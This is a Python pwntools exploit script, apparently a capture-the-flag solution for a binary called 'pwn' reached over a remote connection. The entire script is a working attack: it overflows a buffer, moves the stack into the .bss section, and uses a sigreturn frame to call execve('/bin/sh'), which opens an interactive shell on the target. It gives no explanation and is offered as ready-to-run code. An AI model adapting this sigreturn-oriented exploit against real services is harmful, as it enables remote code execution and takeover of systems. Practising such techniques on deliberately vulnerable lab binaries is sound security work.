from pwn import *
context.update(os = 'linux',arch = 'amd64')
context.log_level = 'debug'
binary = '../src/pwn'
elf = ELF(binary, checksec=False)
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    # libc = ELF('')
    host = '0.0.0.0'
    port = '1145'
    p = remote(host,port)

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
ru = lambda delim: p.recvuntil(delim)
io = lambda: p.interactive()

pop_rax_ret = 0x4011C3
syscall_ret = 0x4011C5
ret = 0x40101a
bss = elf.bss(0xa00)

def pwn():
    sleep(0.2)

    pay = fit(b'\0'*0x50, bss+0x50, 0x401231)
    s(pay)

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = bss
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret

    sleep(0.2)
    pay = b"/bin/sh\x00".ljust(0x58, b'\x00')
    pay += fit(pop_rax_ret, 0xf, syscall_ret) + bytes(frame)
    # gdb.attach(p, "b *0x40124C")
    s(pay)
    # pause()
    io()

pwn()